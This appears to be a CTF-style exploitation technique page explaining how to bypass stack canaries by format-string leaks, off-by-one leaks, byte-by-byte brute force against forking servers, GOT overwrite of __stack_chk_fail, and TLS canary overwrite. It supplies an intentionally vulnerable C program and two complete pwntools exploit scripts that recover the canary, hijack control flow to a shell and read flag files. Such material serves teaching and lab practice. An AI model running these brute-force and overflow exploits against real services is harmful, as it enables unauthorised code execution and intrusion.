---
title: "Stack Canary - Leak It, Brute It, or Walk Around It"
category: pwn
subcategory: canary
type: technique
tags: [canary, stack-canary, stack-protector, brute-force, byte-by-byte, fork-server, info-leak, format-string, off-by-one, got, plt, stack-chk-fail, tls, printf, puts, gets, strcpy, read, pwntools, pwndbg]
difficulty: medium
summary: "The canary is one 8-byte secret at rbp-8 copied from fs:0x28. Leak it, brute it byte by byte on a fork server, or never reach the check at all."
when_to_use:
  - "checksec says 'Canary found' and you have a linear stack overflow"
  - "The program prints a buffer back (printf %s, puts, send) so an off-by-one can leak past it"
  - "There is a format string bug anywhere in the program"
  - "The remote forks per connection, making a 2048-try byte-by-byte brute force practical"
  - "The overflow reaches a function pointer, a saved rbp, or anything used before the epilogue"
tools: [pwntools, checksec, gdb, gef, pwndbg, ROPgadget, readelf, objdump, one_gadget]
related: [stack-buffer-overflow-basics, stack-ret2win, stack-uninitialized-leak, mitigation-partial-overwrite-brute, mitigation-modern-playbook, mitigation-libc-identification, fmtstr-read-leak, fmtstr-arbitrary-write, rop-got-overwrite, rop-stack-pivot, gdb-gef-pwndbg-cheatsheet]
---

## TL;DR

`-fstack-protector` puts a random 8-byte value between the locals and the saved rbp/RIP, and
compares it against the master copy in thread-local storage right before `ret`. It is a
*detection* mechanism, not a barrier: a linear overflow still writes through it. Get the value
(leak, off-by-one print, or byte-by-byte brute against a fork server), write it back unchanged,
and the check passes. Or avoid the check entirely by hijacking something used before the epilogue.

## Recognise it

- `checksec` prints `Canary found`. `objdump -d` shows the prologue/epilogue pair:

```
mov    rax, QWORD PTR fs:0x28        ; x86-64: read the master canary from TLS
mov    QWORD PTR [rbp-0x8], rax      ; stash a copy above the locals
...
mov    rdx, QWORD PTR [rbp-0x8]
sub    rdx, QWORD PTR fs:0x28        ; compare  (or xor on older gcc)
je     ok
call   __stack_chk_fail@plt
```

- Running your overflow prints `*** stack smashing detected ***: terminated` and SIGABRT (signal
  6), not SIGSEGV (signal 11). That message *is* the diagnosis.
- On i386 the same code reads `mov eax, gs:0x14`.
- The binary imports `__stack_chk_fail` (`readelf -r ./vuln | grep chk`).

## Vulnerable source

```c
/* vuln.c - canary on; a printf("%s") that runs BEFORE the epilogue check */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    puts("win() reached");
    system("/bin/sh");
}

void vuln(void) {
    char buf[64];
    printf("name: ");
    fflush(stdout);
    read(0, buf, 0x100);         /* leak oracle: send PAD+1 bytes to kill the NUL terminator */
    printf("hello %s\n", buf);   /* %s walks off the end of buf straight into the canary */
    printf("data: ");
    fflush(stdout);
    read(0, buf, 0x100);         /* the real overflow, with the canary now known */
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("bye");                 /* the "I survived" marker the brute forcer looks for */
    return 0;
}
```

```sh
# canary on every frame, no PIE so win() has a fixed address, NX on
gcc -fstack-protector-all -no-pie -z noexecstack -o vuln vuln.c

checksec --file=./vuln                  # expect: Canary found, NX enabled, No PIE
objdump -d ./vuln | grep -A2 "fs:0x28"  # see the prologue store
readelf -r ./vuln | grep chk            # __stack_chk_fail relocation
```

## Theory

### What the value actually is

glibc generates one canary per **thread** at startup (from `AT_RANDOM` in the auxiliary vector)
and stores it in the thread control block, reachable as `fs:0x28` on x86-64 and `gs:0x14` on
i386. Consequences you can exploit:

- It is **constant for the life of the process** and inherited across `fork()` -- the child gets
  a byte-identical copy of the parent's TLS. It only changes across `execve()` and per thread.
- The low byte is **0x00** ("terminator canary"). That is deliberate: `strcpy`, `sprintf`,
  `gets` and friends stop at a null, so a string-based overflow cannot reproduce the canary and
  a `%s` print cannot leak it. It also means a leak that starts mid-canary is 7 bytes, not 8.
- The compare is `[rbp-8]` against `fs:0x28`, so an attacker who can write **both** copies with
  the same value passes the check regardless of what that value is.

Flags, in increasing coverage: `-fstack-protector` (arrays >= 8 bytes only),
`-fstack-protector-strong` (the modern distro default), `-fstack-protector-all` (every function).

### (a) Leak it with a format string

Any `printf(user_controlled)` gives you the whole stack. The canary is a stack qword ending in
`00` and it sits at a fixed argument index for a given frame. `%N$p` walks straight to it:

```
name: %15$p
hello 0x5c3f2a1b9e4d7c00        <- ends in 00, high entropy: that is the canary
```

Confirm the index once in gdb (`p $rbp-8`, counting qwords from the format string's own frame)
and hardcode it. See `fmtstr-read-leak`.

### (b) Off-by-one into the terminator byte

`printf("%s", buf)` stops at the first null -- which is the canary's own low byte. Overwrite that
one byte with anything non-zero and `%s` keeps going, printing `buf`, then your byte, then the
remaining **7** canary bytes. Reconstruct:

```text
canary = b"\x00" + leaked_seven_bytes
```

The same works with `puts(buf)`, `send(fd, buf, strlen(buf), 0)`, and any "echo back your name"
feature. You must send **exactly** `PAD + 1` bytes: one more and you destroy canary byte 1 too
(and you would only learn 6 bytes).

### (c) Byte-by-byte brute force against a fork server

If the service `fork()`s per connection without `execve`, every child shares the parent's canary.
Guess byte 1 (byte 0 is always `\x00`): send `PAD + b"\x00" + guess` and nothing more, so the
remaining 7 bytes stay untouched. Wrong guess -> `__stack_chk_fail`, SIGABRT, connection dies.
Right guess -> the function returns normally and you see the program's usual output.

Cost: 255 tries per byte over 7 unknown bytes, so **<= 1785 connections** (256 * 8 = 2048 is the
usual quoted bound, avg ~900) -- a couple of minutes. The same loop then walks straight on into
the saved rbp and saved RIP under PIE (`mitigation-partial-overwrite-brute`).

This fails completely against `fork+execve` servers (`xinetd`, `socat ... EXEC:`): every
connection gets a fresh `AT_RANDOM` and therefore a fresh canary.

### (d) Overwrite the `__stack_chk_fail` GOT entry

With **Partial RELRO** the GOT is writable. If you have an arbitrary write (format string, a
write-what-where gadget, an OOB array index), point `got['__stack_chk_fail']` at something
harmless or useful:

- `elf.symbols['main']` -> the abort becomes an infinite restart loop, and the "smash" is free.
- a bare `ret` gadget -> the check simply returns and execution continues into your ROP chain.
- `win` -> the canary check *is* your trigger.

Now you can smash the canary with garbage and you never need its value. Full RELRO kills this.

### (e) Never reach the epilogue

The check runs exactly once, at `ret`. Anything the program does before returning is unprotected:

- **Local function pointers / vtables.** gcc reorders arrays *below* scalars so buffers cannot
  reach scalar pointers, but structs, pointer arrays and heap callbacks are still reachable.
- **Saved rbp of a deeper frame.** Smash a frame pointer that belongs to a caller that is not the
  one doing the check, and you pivot when *it* returns (`rop-stack-pivot`).
- **A direct jump**: a loop counter, a length, a `jmp_buf` used by `longjmp`, a destructor
  pointer, an `__exit_funcs` handler, or the arguments of a call that happens later.
- **The saved RIP of a *different*, unprotected function.** `-fstack-protector-strong` skips
  functions with no arrays; if your overflow is long enough to reach that frame, it is unguarded.

### The TLS canary overwrite trick

The comparison is `[rbp-8] == fs:0x28`, and nothing checks that `fs:0x28` still holds the
original value. The thread control block lives **just above the thread stack**, so a very long
linear overflow (typically in a thread, or a huge `read` length) can reach the TCB and overwrite
the master canary: write the *same* arbitrary value into both `[rbp-8]` and `fs:0x28` and the
check passes with a canary you chose. Any arbitrary write works too once you know the TLS address
(`p $fs_base` in gdb, or `vmmap`). Rare, but it is the answer to "enormous overflow, no leak".

## Attack

1. `checksec` -> `Canary found`. Crash it and confirm SIGABRT + `stack smashing detected`.
2. Find `PAD` = distance from the buffer to the canary: `cyclic 200`, break at the epilogue in
   gdb, `p $rbp-8`, subtract the buffer address. Typically `sizeof(buf)` rounded up to 16, i.e.
   72 for `char buf[64]`.
3. Pick a leak route: format string -> `%N$p`; echo-back -> send `PAD+1` bytes and prepend
   `\x00` to the 7 you get; fork server and no leak -> byte-by-byte brute; arbitrary write and
   Partial RELRO -> `__stack_chk_fail` GOT overwrite; none of those -> a pre-epilogue target (e).
4. Rebuild the payload as `pad + p64(canary) + p64(saved_rbp_or_junk) + chain`. The saved rbp
   matters if the epilogue is `leave; ret` and you plan to keep running -- set it to a writable
   address such as `elf.bss() + 0x800`.
5. Verify the canary before using it: the low byte **must** be `0x00`. If it is not, your offset
   is wrong by a byte or two.
6. Continue with the normal exploit: ret2win, ret2libc, ROP. The canary changes nothing else.

## Exploit

```python
#!/usr/bin/env python3
"""Canary bypass via the off-by-one terminator trick, then ret2win.

Stage 1: send exactly PAD+1 bytes so printf("%s") runs past buf and prints 7 canary bytes.
Stage 2: overflow with the canary written back verbatim.

Local:  ./exploit.py
Remote: ./exploit.py HOST PORT
Build:  gcc -fstack-protector-all -no-pie -z noexecstack -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"
PAD = 72               # buf -> canary; verify in gdb with p $rbp-8

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "info"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+90\nc\n")
    return process(BINARY)


def leak_canary(io):
    """Kill the canary's NUL terminator so %s prints the other 7 bytes."""
    io.recvuntil(b"name: ")
    io.send(b"A" * PAD + b"B")          # exactly PAD+1 bytes, no newline
    io.recvuntil(b"A" * PAD + b"B")
    canary = b"\x00" + io.recv(7)
    value = u64(canary)
    if canary[0] != 0:
        log.warning("low byte is not 00 - PAD is wrong")
    log.success("canary = %#x", value)
    return value


def main():
    io = start()
    canary = leak_canary(io)

    rop = ROP(elf)
    rop.raw(rop.find_gadget(["ret"]).address)     # movaps alignment for system()
    rop.call(elf.symbols["win"])

    payload = b"C" * PAD
    payload += p64(canary)                        # canary restored byte for byte
    payload += p64(elf.bss() + 0x800)             # saved rbp: writable, in case of leave;ret
    payload += rop.chain()

    io.recvuntil(b"data: ")
    io.send(payload)
    io.sendline(b"id; cat flag.txt; cat /flag*")
    io.interactive()


if __name__ == "__main__":
    main()
```

### Byte-by-byte brute force against a fork server

```python
#!/usr/bin/env python3
"""Recover the canary one byte at a time from a forking service (no leak needed).

Works only if the server forks WITHOUT exec: the child inherits the parent's TLS, so the
canary is identical on every connection. Worst case 255*7 tries, average about 900.

Remote: ./brute.py HOST PORT      Local test: ./brute.py   (re-execs, so it will NOT converge)
Build:  gcc -fstack-protector-all -no-pie -z noexecstack -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"
PAD = 72
ALIVE = b"bye"          # printed only if vuln() returned, i.e. the canary check passed

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)


def survives(prefix):
    """Send PAD + prefix and nothing else; True if the epilogue check passed."""
    io = start()
    try:
        io.recvuntil(b"name: ", timeout=2)
        io.sendline(b"probe")
        io.recvuntil(b"data: ", timeout=2)
        io.send(b"A" * PAD + prefix)
        out = io.recvrepeat(0.3)
    except EOFError:
        out = b""
    try:
        io.close()
    except EOFError:
        pass
    return ALIVE in out and b"smashing" not in out


def brute_canary():
    canary = b"\x00"                     # terminator byte is always zero
    while len(canary) < 8:
        for guess in range(256):
            if survives(canary + bytes([guess])):
                canary += bytes([guess])
                log.warning("byte %d = %#04x   canary so far: %s",
                            len(canary) - 1, guess, canary.hex())
                break
        else:
            log.warning("no byte survived at position %d - not a fork server, "
                        "or ALIVE/PAD is wrong", len(canary))
            sys.exit(1)
    return u64(canary)


def main():
    canary = brute_canary()
    log.warning("canary = %#x", canary)

    rop = ROP(elf)
    rop.raw(rop.find_gadget(["ret"]).address)
    rop.call(elf.symbols["win"])

    io = start()
    io.recvuntil(b"name: ")
    io.sendline(b"probe")
    io.recvuntil(b"data: ")
    io.send(b"A" * PAD + p64(canary) + p64(elf.bss() + 0x800) + rop.chain())
    io.sendline(b"id; cat flag.txt; cat /flag*")
    io.interactive()


if __name__ == "__main__":
    main()
```

### Format-string canary leak in one line

```sh
# walk the stack until a qword ends in 00 and looks random - that is the canary
for i in $(seq 6 40); do printf "%%%d\$p\n" $i | ./fmtvuln | grep -o "0x[0-9a-f]*"; done
```

In the exploit: `io.sendline(b"%33$p")` then `canary = int(io.recvline().split()[-1], 16)`.

## Variants & pitfalls

- **Low byte is not 0x00.** Your `PAD` is off. Slide it by one byte at a time until the leak
  ends in `00`.
- **`sendline` in the leak stage.** The `\n` counts as a byte and shifts everything. Use `send`.
- **`-fstack-protector-strong` skips small frames.** If `vuln()` has no array, there is no canary
  in *that* frame even though `checksec` says the binary has canaries. Check the disassembly of
  the actual function, not the binary as a whole.
- **Threads have different canaries.** One leaked in the main thread is useless in a worker.
- **`fork+execve` servers re-randomise.** Byte-by-byte brute forcing silently never converges;
  you will burn 2000 connections and learn nothing. Detect it early: if position 1 has *no*
  surviving byte after 256 tries, stop.
- **Detecting "survived" reliably.** Prefer a marker the program prints after the vulnerable
  function returns; `__stack_chk_fail` output often goes to the server's stderr, not your socket.
- **i386**: canary at `[ebp-0x4]`, master at `gs:0x14`, four bytes not eight, so brute forcing is
  3*255 tries.
- **The canary is not the only guard.** `_FORTIFY_SOURCE` turns `strcpy` into `__strcpy_chk`
  with a compile-time size, which kills the overflow before the canary ever matters.
- **Even with the canary solved you still face PIE/NX/RELRO.** The canary only buys you a
  controlled `ret`. See `mitigation-modern-playbook` for what comes next.

## Tools

| Tool | Use |
|---|---|
| `checksec --file=./vuln` | `Canary found` and the rest of the mitigation set |
| `objdump -d ./vuln \| grep fs:0x28` | Which functions actually carry a canary |
| `readelf -r ./vuln \| grep chk` | `__stack_chk_fail` GOT slot, target for variant (d) |
| `gdb` + `pwndbg` `canary` / `gef` `canary` | Print the live canary and `$fs_base` instantly |
| `cyclic` / `cyclic_find` | Exact `PAD` from buffer start to `[rbp-8]` |
| `pwntools` `fmtstr_payload`, `u64`, `flat` | Build the leak and the restore payload |
| `ltrace`/`strace` on the service | Distinguish `fork` from `fork+execve` before brute forcing |
